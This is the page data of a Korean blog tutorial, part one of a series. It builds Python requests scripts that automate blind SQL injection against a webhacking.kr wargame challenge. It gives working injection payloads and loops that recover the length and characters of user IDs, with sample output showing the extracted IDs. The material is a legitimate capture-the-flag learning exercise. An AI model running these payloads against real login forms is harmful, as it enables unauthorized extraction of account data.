{"componentChunkName":"component---src-templates-blog-post-js","path":"/Python/Python-requests를-이용한-blind-injecthion-스크립트-제작-1편/","result":{"data":{"site":{"siteMetadata":{"author":"JaeSeoKim","comment":{"utterances":"JaeSeoKim/jaeseokim.github.io"},"sponsor":{"buyMeACoffeeId":"jaeseokim"}}},"markdownRemark":{"excerpt":"Python requests를 이용한 blind injecthion 스크립트 제작 일단 시작하기전에 앞서 Blind SQL Injecthion에 대해 모르신다면 이전 포스트 를 참조하세요. Python의 requests라이브러리를 이용해서 패킷을 전송하고 질의한 응답값을 보고 참과 거짓을 구분하여 자동으로 분석해주는 스크립트를 제작 하는 것이 목표! re…","html":"<p>Python requests를 이용한 blind injecthion 스크립트 제작</p>\n<ul>\n<li>일단 시작하기전에 앞서 Blind SQL Injecthion에 대해 모르신다면 <a href=\"https://jaeseokim.tistory.com/20\">이전 포스트</a> 를 참조하세요.</li>\n</ul>\n<p>Python의 requests라이브러리를 이용해서 패킷을 전송하고 질의한 응답값을 보고 참과 거짓을 구분하여 자동으로 분석해주는 스크립트를 제작 하는 것이 목표!</p>\n<p>requests 라이브러리</p>\n<ul>\n<li>\n<p>requests.get</p>\n<p>get 요청할때 사용, 전달 가능 인자값 (url, params, cookies, headers 등)</p>\n<p>ex) response = requests.get(url, params)</p>\n</li>\n<li>\n<p>requests.post</p>\n<p>post 요청할때 사용, 전달 가능 인자값 (url, data, cookies, headers 등)</p>\n<p>ex) response = requests.post(url, params)</p>\n</li>\n<li>\n<p>headers 구성</p>\n<p>headers = {'Content-Type': 'application/json; charset=utf-8'}</p>\n</li>\n<li>\n<p>cookies 구성</p>\n<p>cookies = {'sid': 'asdfghjk12qwe34rt'}</p>\n</li>\n<li>\n<p>params 구성</p>\n<p>params = {'id': 'testid', 'pw': 'testpasswd'}</p>\n</li>\n<li>\n<p>response.status_code</p>\n<p>응답 코드</p>\n</li>\n<li>\n<p>response.text</p>\n<p>응답 결과를 text로</p>\n</li>\n<li>\n<p>response.elapsed.total_seconds()</p>\n<p>응답까지 걸린 시간을 체크 (Time-Based Blind injecthion에 사용)</p>\n</li>\n</ul>\n<p>일단 간단하게 sqi를 위한 라이브러리 사용법은 위에 있는 정도만 알고 있어도 충분 합니다.</p>\n<p>더 자세한 정보를 얻고 싶다면 <a href=\"https://www.w3schools.com/python/module_requests.asp\">w3schools-python-requests</a> 를 참조하세요.</p>\n<p>일단 <a href=\"http://webhacking.kr\">webhacking.kr</a> 의 21번 문제를 예시로 스크립트를 작성 해보겠습니다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 569px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAKABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAMFBP/EABQBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAZDNLiKMD//EABsQAAICAwEAAAAAAAAAAAAAAAECAxIAEzEz/9oACAEBAAEFAo1sGQqD2EnVY5N6/wD/xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/AT//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/AT//xAAaEAACAwEBAAAAAAAAAAAAAAAAAREhkTFB/9oACAEBAAY/AvMJhYWKzrGf/8QAGhABAQEAAwEAAAAAAAAAAAAAAQARIVFx8f/aAAgBAQABPyFmA4epbppRgx6hiLPb60lVdv/aAAwDAQACAAMAAAAQcM//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/ED//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/ED//xAAcEAEAAwACAwAAAAAAAAAAAAABABEhMVFBcZH/2gAIAQEAAT8QCK5WtO9kMlBMucvb7hWSaQYMMTA0Co1gZn0RnCU1b8E//9k='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"iTKLEsmtKxwBhV88LRveUkimg\"\n        title=\"iTKLEsmtKxwBhV88LRveUkimg\"\n        src=\"/static/1ddbc816a546227c1901699aa48a6fee/17a45/iTKLEsmtKxwBhV88LRveUkimg.jpg\"\n        srcset=\"/static/1ddbc816a546227c1901699aa48a6fee/f93b5/iTKLEsmtKxwBhV88LRveUkimg.jpg 300w,\n/static/1ddbc816a546227c1901699aa48a6fee/17a45/iTKLEsmtKxwBhV88LRveUkimg.jpg 569w\"\n        sizes=\"(max-width: 569px) 100vw, 569px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n    </span></p>\n<p>문제를 보면 아이디와 비밀번호를 알아낸 다음 플래그 값을 찾아야 하는 문제 입니다.</p>\n<p>일단 blind sql injection 점검 문자열을 작성하여 어떤 응답 값이 오는지 확인해봅니다.</p>\n<p>일단 아이디와 패스워드 둘다 부정확 할때에는 <strong>login fail</strong> 이라는 응답값이 날라오고 아이디는 정확하지만 패스워드가 부정확하다고 판단 할때에는 <strong>wrong password</strong> 라는 값이 나타나는 것을 볼수가 있습니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">https://webhacking.kr/challenge/bonus-1/index.php?id=&amp;pw=</span></span></code></pre>\n<p>일단 url를 보면 이번 문제는 GET 으로 보내고 응답을 받는 것을 알수가 있습니다.</p>\n<p>그리고 파라미터값은 id,pw를 통해 넘기고 있다는 것을 알수가 있습니다.</p>\n<p>이제 패스워드를 알아내기전 아이디를 먼저 알아내보는 스크립트를 작성합니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"python\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">url </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;https://webhacking.kr/challenge/bonus-1/index.php&#39;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\">#url 주소를 입력</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">cookies </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;PHPSESSID&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk6\">&#39;사용자의 쿠기 값 입력&#39;</span><span class=\"mtk1\">} </span><span class=\"mtk5 mtki\">#세션 쿠키를 입력</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_id_len</span><span class=\"mtk1\">():</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    id_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">while</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        id_len</span><span class=\"mtk8\">=</span><span class=\"mtk1\">id_len</span><span class=\"mtk8\">+</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        value </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&#39; or char_length(id) = </span><span class=\"mtk7\">{}</span><span class=\"mtk6\">   -- &#39;&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(id_len) </span><span class=\"mtk5 mtki\">#반복하면서 id의 글자수를 비교하는 Payload 코드 작성</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;id&#39;</span><span class=\"mtk1\">: value, </span><span class=\"mtk6\">&#39;pw&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk6\">&#39;test&#39;</span><span class=\"mtk1\">} </span><span class=\"mtk5 mtki\"># id에 Payload 코드 삽입 pw는 아무 문자나 보낸다.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        response </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> requests.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(url,</span><span class=\"mtk4 mtki\">params</span><span class=\"mtk8\">=</span><span class=\"mtk1\">params, </span><span class=\"mtk4 mtki\">cookies</span><span class=\"mtk8\">=</span><span class=\"mtk1\">cookies) </span><span class=\"mtk5 mtki\">#GET을 통해 전달</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(response.status_code) </span><span class=\"mtk5 mtki\"># 응답 코드 확인 200번아니면 오류 상태</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(value) </span><span class=\"mtk5 mtki\"># 전달되는 Payload 코드 확인</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;wrong password&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> response.text: </span><span class=\"mtk5 mtki\">#응답 값에 wrong password가 있다면 참인 결과 이니 빠져나옴</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10 mtki\">break</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">return</span><span class=\"mtk1\"> id_len </span><span class=\"mtk5 mtki\">#id 길이 반환</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk4\">__name__</span><span class=\"mtk1\"> </span><span class=\"mtk8\">==</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;__main__&#39;</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;id의 길이는 : &quot;</span><span class=\"mtk8\">+str</span><span class=\"mtk1\">(</span><span class=\"mtk3\">find_id_len</span><span class=\"mtk1\">()))</span></span></span></code></pre>\n<p><strong>char_length()</strong> 함수를 이용해서 반복문을 통해 만약 id의 길이가 같으면 <strong>wrong password</strong> 라는 값을 나타내니 break를 통해 빠져나오고 그때의 id 길이를 반환합니다.</p>\n<p>이제 이렇게 id의 길이를 구하였는데 이러한 조건을 통해 id를 알아내도록 하겠습니다.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"python\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">import</span><span class=\"mtk1\"> requests</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">url </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;https://webhacking.kr/challenge/bonus-1/index.php&#39;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\">#url 주소를 입력</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">cookies </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;PHPSESSID&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk6\">&#39;사용자의 쿠기 값 입력&#39;</span><span class=\"mtk1\">} </span><span class=\"mtk5 mtki\">#세션 쿠키를 입력</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_id_len</span><span class=\"mtk1\">():</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    id_len </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">while</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        id_len</span><span class=\"mtk8\">=</span><span class=\"mtk1\">id_len</span><span class=\"mtk8\">+</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        value </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&#39; or char_length(id) = </span><span class=\"mtk7\">{}</span><span class=\"mtk6\">   -- &#39;&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(id_len) </span><span class=\"mtk5 mtki\">#반복하면서 id의 글자수를 비교하는 Payload 코드 작성</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;id&#39;</span><span class=\"mtk1\">: value, </span><span class=\"mtk6\">&#39;pw&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk6\">&#39;test&#39;</span><span class=\"mtk1\">} </span><span class=\"mtk5 mtki\"># id에 Payload 코드 삽입 pw는 아무 문자나 보낸다.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        response </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> requests.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(url,</span><span class=\"mtk4 mtki\">params</span><span class=\"mtk8\">=</span><span class=\"mtk1\">params, </span><span class=\"mtk4 mtki\">cookies</span><span class=\"mtk8\">=</span><span class=\"mtk1\">cookies) </span><span class=\"mtk5 mtki\">#GET을 통해 전달</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(response.status_code) </span><span class=\"mtk5 mtki\"># 응답 코드 확인 200번아니면 오류 상태</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(value) </span><span class=\"mtk5 mtki\"># 전달되는 Payload 코드 확인</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;wrong password&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> response.text: </span><span class=\"mtk5 mtki\">#응답 값에 wrong password가 있다면 참인 결과 이니 빠져나옴</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10 mtki\">break</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">return</span><span class=\"mtk1\"> id_len </span><span class=\"mtk5 mtki\">#id 길이 반환</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">def</span><span class=\"mtk1\"> </span><span class=\"mtk3\">find_id_str</span><span class=\"mtk1\">(</span><span class=\"mtk7 mtki\">id_len</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    id_str </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">for</span><span class=\"mtk1\"> </span><span class=\"mtk8\">len</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> </span><span class=\"mtk8\">range</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,id_len</span><span class=\"mtk8\">+</span><span class=\"mtk7\">1</span><span class=\"mtk1\">):</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10 mtki\">for</span><span class=\"mtk1\"> </span><span class=\"mtk8\">ascii</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> </span><span class=\"mtk8\">range</span><span class=\"mtk1\">(</span><span class=\"mtk7\">97</span><span class=\"mtk1\">,</span><span class=\"mtk7\">123</span><span class=\"mtk1\">): </span><span class=\"mtk5 mtki\">#ascii a~z까지의 값 반복</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            value </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&#39; or ascii(substring(id,</span><span class=\"mtk7\">{}</span><span class=\"mtk6\">,1)) = </span><span class=\"mtk7\">{}</span><span class=\"mtk6\"> -- &#39;&quot;</span><span class=\"mtk1\">.</span><span class=\"mtk3\">format</span><span class=\"mtk1\">(</span><span class=\"mtk8\">len</span><span class=\"mtk1\">,</span><span class=\"mtk8\">ascii</span><span class=\"mtk1\">)  </span><span class=\"mtk5 mtki\"># 반복하면서 id을 substring 한다음 ascii로 변환한 값을 통해 비교해서 정답을 찾아냄</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            params </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> {</span><span class=\"mtk6\">&#39;id&#39;</span><span class=\"mtk1\">: value, </span><span class=\"mtk6\">&#39;pw&#39;</span><span class=\"mtk1\">: </span><span class=\"mtk6\">&#39;test&#39;</span><span class=\"mtk1\">}  </span><span class=\"mtk5 mtki\"># id에 Payload 코드 삽입 pw는 아무 문자나 보낸다.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            response </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> requests.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(url, </span><span class=\"mtk4 mtki\">params</span><span class=\"mtk8\">=</span><span class=\"mtk1\">params, </span><span class=\"mtk4 mtki\">cookies</span><span class=\"mtk8\">=</span><span class=\"mtk1\">cookies)  </span><span class=\"mtk5 mtki\"># GET을 통해 전달</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(response.status_code)  </span><span class=\"mtk5 mtki\"># 응답 코드 확인 200번아니면 오류 상태</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(value)  </span><span class=\"mtk5 mtki\"># 전달되는 Payload 코드 확인</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;wrong password&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk10\">in</span><span class=\"mtk1\"> response.text:  </span><span class=\"mtk5 mtki\"># 응답 값에 wrong password가 있다면 참인 결과 이니 빠져나옴</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                id_str</span><span class=\"mtk8\">+=chr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">ascii</span><span class=\"mtk1\">)</span><span class=\"mtk8\">+</span><span class=\"mtk6\">&quot;:&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk5 mtki\">#참이라면 ascii코드를 char형으로 변경해서 저장</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        id_str</span><span class=\"mtk8\">+=</span><span class=\"mtk6\">&quot;</span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10 mtki\">return</span><span class=\"mtk1\"> id_str </span><span class=\"mtk5 mtki\">#한 문자에 대한 검색이 끝날시 엔터 처리</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10 mtki\">if</span><span class=\"mtk1\"> </span><span class=\"mtk4\">__name__</span><span class=\"mtk1\"> </span><span class=\"mtk8\">==</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&#39;__main__&#39;</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">print</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;아이디 조합 : </span><span class=\"mtk8\">\\n</span><span class=\"mtk6\">&quot;</span><span class=\"mtk8\">+</span><span class=\"mtk3\">find_id_str</span><span class=\"mtk1\">(</span><span class=\"mtk3\">find_id_len</span><span class=\"mtk1\">()))</span></span></span></code></pre>\n<p>결과값을 보면 아래와 같은 결과 값이 나오는데</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">아이디 조합 :</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">a:g:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">d:u:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">eⓂ</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">i:s:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">n:t:</span></span></code></pre>\n<p>이러한 결과 값을 보고 id는 <strong>admin, guest</strong> 두가지 아이디가 존재 한다는 것을 확인 할 수가 있습니다.</p>\n<p>이제 이러한 결과 값을 가지고 비번을 찾아보는 스크립트 제작은 다음 글에 이어서 알려드리겠습니다.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .one-dark-pro {\n    background-color: #282c34;\n    color: #abb2bf;\n  }\n  .one-dark-pro .mtki { font-style: italic; }\n  .one-dark-pro .mtk10 { color: #C678DD; }\n  .one-dark-pro .mtk1 { color: #ABB2BF; }\n  .one-dark-pro .mtk8 { color: #56B6C2; }\n  .one-dark-pro .mtk6 { color: #98C379; }\n  .one-dark-pro .mtk5 { color: #7F848E; }\n  .one-dark-pro .mtk3 { color: #61AFEF; }\n  .one-dark-pro .mtk7 { color: #D19A66; }\n  .one-dark-pro .mtk4 { color: #E06C75; }\n  .one-dark-pro .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>","tableOfContents":"","frontmatter":{"date":"2019년 10월 23일","title":"Python requests를 이용한 blind injecthion 스크립트 제작 (1편)","tags":["Python","requests","blind injection"]}}},"pageContext":{"slug":"/Python/Python-requests를-이용한-blind-injecthion-스크립트-제작-1편/","previous":null,"next":{"fields":{"slug":"/Python/Python-requests를-이용한-blind-injecthion-스크립트-제작-2편/"},"frontmatter":{"title":"Python requests를 이용한 blind injecthion 스크립트 제작 (2편)"}}}},"staticQueryHashes":["1081905842","3911196313"]}